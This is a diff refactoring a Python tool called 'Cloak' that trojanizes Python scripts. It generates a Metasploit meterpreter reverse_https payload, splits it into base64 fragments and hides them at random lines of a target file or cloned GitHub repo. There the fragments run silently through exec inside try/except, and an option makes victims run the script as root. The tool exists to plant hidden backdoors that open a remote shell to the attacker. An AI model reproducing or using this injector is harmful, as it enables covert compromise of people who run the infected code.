@@ -8,196 +8,301 @@ from re import search
 if sys.version_info < (3, 0):
     input = raw_input
 
-# Colors and shit like that
-white = '\033[1;97m'
-green = '\033[1;32m'
-red = '\033[1;31m'
-end = '\033[1;m'
-info = '\033[1;33m[!]\033[1;m'
-que = '\033[1;34m[?]\033[1;m'
-bad = '\033[1;31m[-]\033[1;m'
-good = '\033[1;32m[+]\033[1;m'
-run = '\033[1;97m[>]\033[1;m'
+# Colors and formatting
+class Colors:
+    white = '\033[1;97m'
+    green = '\033[1;32m'
+    red = '\033[1;31m'
+    blue = '\033[1;34m'
+    yellow = '\033[1;33m'
+    end = '\033[1;m'
+    
+    @staticmethod
+    def info(msg):
+        return f'\033[1;33m[!]\033[1;m {msg}'
+    
+    @staticmethod
+    def question(msg):
+        return f'\033[1;34m[?]\033[1;m {msg}'
+    
+    @staticmethod
+    def bad(msg):
+        return f'\033[1;31m[-]\033[1;m {msg}'
+    
+    @staticmethod
+    def good(msg):
+        return f'\033[1;32m[+]\033[1;m {msg}'
+    
+    @staticmethod
+    def run(msg):
+        return f'\033[1;97m[>]\033[1;m {msg}'
 
-# Banner
-print ('''%s
-    _________  %s__%s                __    
-    \%s_%s   ___ \|  |   _________  |  | __
-    /    \  \/|  |  /  %s_%s \__  \ |  |/ /
-    \     \___|  |_(  %s(_)%s ) %s__%s \|    %s<%s 
-     \______  /____/\____(____  /__|_ \\
-            %s\/%s                \/     \/%s\n''' % (white, red, white, red, white, red, white, red, white, red, white, red, white, red, white, end))
+# Custom Banner
+def show_banner():
+    banner = f"""{Colors.blue}
+   _____ _                 _    
+  / ____| |               | |   
+ | |    | | ___   ___ __ _| | __
+ | |    | |/ _ \ / __/ _` | |/ /
+ | |____| | (_) | (_| (_| |   < 
+  \_____|_|\___/ \___\__,_|_|\_\\
+  
+  {Colors.white}Advanced Payload Injector{Colors.blue}
+  {'='*28}{Colors.end}
+"""
+    print(banner)
 
-# Connecting to google DNS and retrieving IP address of host
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-s.connect(("8.8.8.8", 80))
-LHOST = s.getsockname()[0]
-s.close()
+show_banner()
 
+# Get local IP
+def get_local_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return None
+
+LHOST = get_local_ip()
 
 def check_external_dependency(command, help=None):
     check_command = os.system('command -v %s > /dev/null' % command)
     if check_command != 0:
-        print ('%s%s Couldn\'t find %s!' % (bad, red, command))
+        print(Colors.bad(f"Couldn't find {command}!"))
         if help:
-            print ('%s %s' % (info, help))
-        quit()
-
+            print(Colors.info(help))
+        sys.exit(1)
 
 check_external_dependency(
     'msfvenom',
     help='See http://bit.ly/2pgJxxj for installation guide'
 )
 
-# Prompting the user for LHOST
-choice = input('%s %s%s%s : Use this as LHOST? [Y/n] ' % (que, green, LHOST, end)).lower()
-if choice == 'n':
-    LHOST = input('%s Enter LHOST: ' % que)
-
-# Prompting the user for LPORT
-LPORT = '443'
-choice = input('%s %s%s%s : Use this as LPORT? [Y/n] ' % (que, green, LPORT, end)).lower()
-if choice == 'n':
-    LPORT = input('%s Enter LPORT: ' % que)
-
-
-def import_choice():
-    script = input('%s Enter Github/File path: ' % que)
-    if 'https://github.com' in script:
-        github(script)
+# User configuration
+def get_user_config():
+    global LHOST, LPORT
+    
+    if not LHOST:
+        LHOST = input(Colors.question("Couldn't detect your IP. Enter LHOST: "))
     else:
-        local(script)
+        choice = input(Colors.question(f"Use {LHOST} as LHOST? [Y/n] ")).lower()
+        if choice == 'n':
+            LHOST = input(Colors.question("Enter LHOST: "))
 
+    LPORT = '443'
+    choice = input(Colors.question(f"Use {LPORT} as LPORT? [Y/n] ")).lower()
+    if choice == 'n':
+        LPORT = input(Colors.question("Enter LPORT: "))
 
-def local(script):
-    github = False
-    injector(script)
+get_user_config()
 
-
-def github(script):
-    repo = script
-    directory = repo.split('/')[4] # Extracts repo name from github URL
-    cwd = os.path.dirname(os.path.abspath(__file__)) # Finds the path of cloak.py
-    os.system('git clone %s %s/%s -q' % (repo, cwd, directory)) # clones the repo
-    os.system('cd %s/%s && ls > temp.txt' % (cwd, directory)) # Navigate to cloned repo and do ls and store its output in temp.txt
-    python_files = [] # we will store the found python files here
-    with open('%s/%s/temp.txt' % (cwd, directory), 'r') as f: # reading tmp.txt
-        for line in f:
-            if '.py' in line: # if a file contains .py
-                python_files.append(line.strip('\n')) # adding the filename to python_files list
-    if len(python_files) == 0: # if there are 0 python files
-        print ('%s No python file found.' % bad)
-        yes_no = input('%s Would you like to manually select a file? [Y/n] ' % info).lower()
-        if yes_no == 'n':
-            quit()
-        else:
-            os.system('cd %s/%s && ls > temp.txt' % (cwd, directory)) # Navigate to cloned repo and do ls and store its output in temp.txt
-            all_files = [] # we will store all files here
-            with open('%s/%s/temp.txt' % (cwd, directory), 'r') as f: # reading tmp.txt
+# Main injection functions
+class Injector:
+    def __init__(self):
+        self.method = 'https'
+        self.github = False
+        self.cwd = os.path.dirname(os.path.abspath(__file__))
+        
+    def process_github_repo(self, repo_url):
+        try:
+            repo_name = repo_url.split('/')[4]
+            clone_path = f"{self.cwd}/{repo_name}"
+            
+            print(Colors.run(f"Cloning repository from {repo_url}"))
+            os.system(f'git clone {repo_url} {clone_path} -q')
+            
+            os.system(f'cd {clone_path} && ls > temp.txt')
+            
+            python_files = []
+            with open(f'{clone_path}/temp.txt', 'r') as f:
                 for line in f:
-                    all_files.append(line.strip('\n')) # adding the filename to python_files list
-            number = 1
-            for file in all_files:
-                print ('%s. %s' % (number, file)) # it will print all files like 1. main.py 2. run.sh 3. test.txt
-                number = number + 1
-            number = input('%s Select a file to infect: ' % que) # asking the user to select a file to inject
-            script = all_files[int(number) - 1] # just simple maths to select the chosen file from all_files list
-
-    elif len(python_files) > 1: # if there are more than 1 python files
-        print ('%s More than one python scripts found.')
-        number = 1
-        for file in python_files:
-            print ('%s. %s' % (number, file)) # it will print all files like 1. main.py 2. run.py 3. test.py
-            number = number + 1
-        number = input('%s Select a file to infect: ' % que) # asking the user to select a file to inject
-        script = python_files[int(number) - 1] # just simple maths to select the chosen file from python_files list
-
-    elif len(python_files) == 1: # if there's 1 python file
-        script = python_files[0] # fetching the only element from the python_files list
-    print ('%s Payload will be injected in %s%s%s' % (info, green, script, end))
-    os.system('rm -r %s/%s/temp.txt' % (cwd, directory)) # removes the temp.txt
-    cwd2 = os.chdir('%s/%s' % (cwd, directory)) # changes the working directory to the repo directory
-    github = True
-    injector(script)
-
-
-def injector(script):
-    method = 'https'
-    print ('%s Generating Payload' % run)
-    os.system("msfvenom -p python/meterpreter/reverse_%s -f raw --platform python -e generic/none -a python %s LPORT=%s > payload.txt" % (method, LHOST, LPORT))
-    payload = [] # a list containing
-    with open('payload.txt', 'r+') as f: # opens payload.txt
-        for line in f:
-            payload.append(line.strip('\n')) # adds this line to payload list
-        f.close() # closes the file
-    payload = ''.join(payload) # converts payload list into a string
-    payload = payload.split("'") # converts the payload into a list by splitting it from the character '
-    base64_string = payload[3] # retrieves the third *coughs* the fourth element from the payload list
-    print ('%s Injecting into %s%s%s' % (run, green, script, end))
-    injectable_lines = [] # Lines where payload pieces can be inserted safely
-    imports = [] # lines that are being used to import libraries. Perfect for inserting 'import base64, sys'
-    script_list = [] # list that contains all the lines of target script
-    number = 0 # just a variable that we will be using later
-    with open(script, 'r') as f: # opens the target script
-        for line in f:
-            script_list.append(line.strip('\n')) # adds current line to the script_list
-            match = search(r'^[a-zA-Z0-9]', line) # checks if the first character is an alphabet or digit
-            match2 = search(r'^[\t]', line)
-            if match and not line.startswith('except') and not line.startswith('else') and not line.startswith('#') and not match2:
-                injectable_lines.append(number - 1) # add the line to injectable_lines list
-            if line.startswith('from') or line.startswith('import'): # if the line starts with from or import
-                imports.append(number) # add that line to imports list
-            else: # If the line doesn't start with tab, space, import, from
-                pass
-            number = number + 1 # increase the value of number by 1
-        f.close() # close the file
-    if 'import base64, sys' in script_list: # searches for 'import base64. sys' in script_list
-        print ('%s Seems like this file has been already injected by Cloak.' % bad)
-        if github:
-            choice = input('%s Would you like to download a fresh copy? [Y/n]' % que).lower()
-            if choice == 'n':
-                pass
+                    if line.strip().endswith('.py'):
+                        python_files.append(line.strip())
+            
+            if not python_files:
+                print(Colors.bad("No Python files found in repository."))
+                return self.manual_file_select(clone_path)
+            
+            if len(python_files) > 1:
+                print(Colors.info("Multiple Python files found:"))
+                for i, file in enumerate(python_files, 1):
+                    print(f"  {i}. {file}")
+                
+                choice = input(Colors.question("Select file to infect (number): "))
+                try:
+                    selected_file = python_files[int(choice)-1]
+                except (ValueError, IndexError):
+                    print(Colors.bad("Invalid selection"))
+                    return self.manual_file_select(clone_path)
             else:
-                os.chdir('%s' % cwd) # changes the working directory to the cloak.py directory
-                os.system('rm -r %s' % directory) # removes the older copy of downloaded repo
-                os.system('git clone %s %s/%s -q' % (repo, cwd, directory)) # clones the repo
-                cwd2 = os.chdir('%s/%s' % (cwd, directory)) # changes the working directory to the repo directory
-                injector() # Calls the injector() function
+                selected_file = python_files[0]
+            
+            print(Colors.info(f"Payload will be injected into: {selected_file}"))
+            os.remove(f'{clone_path}/temp.txt')
+            os.chdir(clone_path)
+            self.github = True
+            self.inject(selected_file)
+            
+        except Exception as e:
+            print(Colors.bad(f"Error processing GitHub repo: {str(e)}"))
+            sys.exit(1)
+
+    def manual_file_select(self, path):
+        os.system(f'cd {path} && ls > temp.txt')
+        files = []
+        with open(f'{path}/temp.txt', 'r') as f:
+            files = [line.strip() for line in f if line.strip()]
+        
+        if not files:
+            print(Colors.bad("No files found in directory"))
+            sys.exit(1)
+            
+        print(Colors.info("Available files:"))
+        for i, file in enumerate(files, 1):
+            print(f"  {i}. {file}")
+            
+        choice = input(Colors.question("Select file to infect (number): "))
+        try:
+            selected_file = files[int(choice)-1]
+            print(Colors.info(f"Payload will be injected into: {selected_file}"))
+            os.remove(f'{path}/temp.txt')
+            os.chdir(path)
+            self.inject(selected_file)
+        except (ValueError, IndexError):
+            print(Colors.bad("Invalid selection"))
+            sys.exit(1)
+
+    def process_local_file(self, file_path):
+        if not os.path.exists(file_path):
+            print(Colors.bad("File not found"))
+            sys.exit(1)
+            
+        if not file_path.endswith('.py'):
+            print(Colors.bad("Only Python files can be injected"))
+            sys.exit(1)
+            
+        self.inject(file_path)
+
+    def generate_payload(self):
+        print(Colors.run("Generating payload"))
+        payload_file = 'payload.txt'
+        
+        cmd = f"msfvenom -p python/meterpreter/reverse_{self.method} -f raw " \
+              f"--platform python -e generic/none -a python LHOST={LHOST} " \
+              f"LPORT={LPORT} > {payload_file}"
+        
+        if os.system(cmd) != 0:
+            print(Colors.bad("Payload generation failed"))
+            sys.exit(1)
+            
+        with open(payload_file, 'r') as f:
+            payload = ''.join(line.strip('\n') for line in f)
+        
+        try:
+            base64_part = payload.split("'")[3]
+            os.remove(payload_file)
+            return base64_part
+        except IndexError:
+            print(Colors.bad("Invalid payload format"))
+            sys.exit(1)
+
+    def inject(self, target_file):
+        base64_payload = self.generate_payload()
+        print(Colors.run(f"Injecting into {target_file}"))
+        
+        with open(target_file, 'r') as f:
+            original_lines = [line.rstrip('\n') for line in f]
+        
+        # Check if already infected
+        if any('exec(base64.b64decode' in line for line in original_lines):
+            print(Colors.bad("File appears to already be infected"))
+            if self.github:
+                choice = input(Colors.question("Download fresh copy? [Y/n] ")).lower()
+                if choice != 'n':
+                    repo_name = os.path.basename(os.getcwd())
+                    os.chdir(self.cwd)
+                    os.system(f'rm -rf {repo_name}')
+                    os.system(f'git clone {repo_url} {self.cwd}/{repo_name} -q')
+                    os.chdir(f'{self.cwd}/{repo_name}')
+                    self.inject(target_file)
+            sys.exit(1)
+        
+        # Find injection points
+        injectable_lines = []
+        import_lines = []
+        
+        for i, line in enumerate(original_lines):
+            # Skip comments, empty lines, and control structures
+            if (line and not line.startswith(('#', ' ', '\t', 'except', 'else', 'finally')) 
+               and not line.lstrip().startswith(('except', 'else', 'finally')):
+                injectable_lines.append(i)
+            
+            if line.lstrip().startswith(('import ', 'from ')):
+                import_lines.append(i)
+        
+        if not injectable_lines:
+            print(Colors.bad("No suitable injection points found"))
+            sys.exit(1)
+        
+        # Split payload into parts
+        half = len(base64_payload) // 2
+        payload_parts = [
+            f"var1 = '''{base64_payload[:half]}'''",
+            f"var2 = '''{base64_payload[half:]}'''",
+            "vars = var1 + var2",
+            "try:\n\texec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]](vars)))\nexcept:\n\tpass"
+        ]
+        
+        # Select random injection points in order
+        while True:
+            points = sorted(random.sample(injectable_lines, 4))
+            if points[0] < points[1] < points[2] < points[3]:
+                break
+        
+        # Insert payload parts
+        modified_lines = original_lines.copy()
+        for i, point in enumerate(points):
+            modified_lines.insert(point + i + 1, payload_parts[i])
+        
+        # Add imports
+        root_check = input(Colors.question("Require root execution? [y/N] ")).lower() == 'y'
+        
+        if root_check:
+            root_code = [
+                "import base64, sys, commands",
+                "if sys.platform.startswith('linux'):",
+                "\tif commands.getoutput('whoami') != 'root':",
+                f"\t\tprint('{target_file} needs root permissions')",
+                "\t\tsys.exit(1)"
+            ]
+            
+            if import_lines:
+                modified_lines.insert(import_lines[-1] + 1, '\n'.join(root_code))
+            else:
+                modified_lines.insert(0, '\n'.join(root_code))
         else:
-            print ('%s Please use a fresh file for injection.' % info)
-            quit()
-    while True:  # its an infinite loop unless its broken manually
-        # We can't insert all the pieces of payload in one place as it may raise suspicion so we will
-        # randomly select positions for those positions. random.choice(list) retrieve a random element from list
-        position_a, position_b = random.choice(injectable_lines), random.choice(injectable_lines)
-        position_c, position_d = random.choice(injectable_lines), random.choice(injectable_lines)
-        #lets make sure the positions of the pieces of payload are in a particular order otherwise it will raise error
-        if position_a < position_b < position_c < position_d:
-            script_list.insert(int(position_a + 1), 'var1 = \'\'\'%s\'\'\'' % base64_string[:int(len(base64_string)/2)]) #[:len(string)/2] will give the first half of a string
-            script_list.insert(int(position_b + 2), 'var2 = \'\'\'%s\'\'\'' % base64_string[int(len(base64_string)/2):]) #and insert.list() is used to insert a element in list
-            script_list.insert(int(position_c + 3), 'vars = var1 + var2')
-            script_list.insert(int(position_d + 4), 'try:\n\texec(base64.b64decode({2:str,3:lambda b:bytes(b,\'UTF-8\')}[sys.version_info[0]](vars)))\nexcept:\n\tpass')
-            root = input('%s Ask victim to run injected script as root? [y/N] ' % que).lower()
-            if root == 'y':
-                root = True
-            if len(imports) < 1: # if there are no imports in the script
-                if root:
-                    script_list.insert(injectable_lines[0], 'import base64, sys, commands\nif (sys.platform.startswith("linux")) :\n\tif (commands.getoutput("whoami")) != "root" :\n\t\tprint ("%s needs to be run as root.")\n\t\tquit()\n' % script)
-                else:
-                    script_list.insert(random.choice(imports), 'import base64, sys')
+            if import_lines:
+                modified_lines.insert(import_lines[-1] + 1, "import base64, sys")
             else:
-                if root:
-                    script_list.insert(injectable_lines[0], 'import base64, sys, commands\nif (sys.platform.startswith("linux")) :\n\tif (commands.getoutput("whoami")) != "root" :\n\t\tprint ("%s needs to be run as root.")\n\t\tquit()\n' % script)
-                else:
-                    script_list.insert(random.choice(imports), 'import base64, sys')
-            break # breaks the loop as the payload has been injected
-        else:  # if the randomly selected variables are not in ascending order
-            pass
-    with open(script, 'r+') as f:  # opens the target script
-        for line in script_list:
-            f.write(line + '\n')  # writes a line to the target script
-        f.close() # closes the file
-    os.system('rm payload.txt')  # removes payload.txt
-    print ('%s %s%s%s was successfully injected' % (good, green, script, end))
+                modified_lines.insert(0, "import base64, sys")
+        
+        # Write modified file
+        with open(target_file, 'w') as f:
+            f.write('\n'.join(modified_lines))
+        
+        print(Colors.good(f"Injection successful: {target_file}"))
 
-import_choice()
+def main():
+    target = input(Colors.question("Enter GitHub URL or local file path: "))
+    
+    injector = Injector()
+    
+    if target.startswith('https://github.com'):
+        injector.process_github_repo(target)
+    else:
+        injector.process_local_file(target)
+
+if __name__ == "__main__":
+    main()
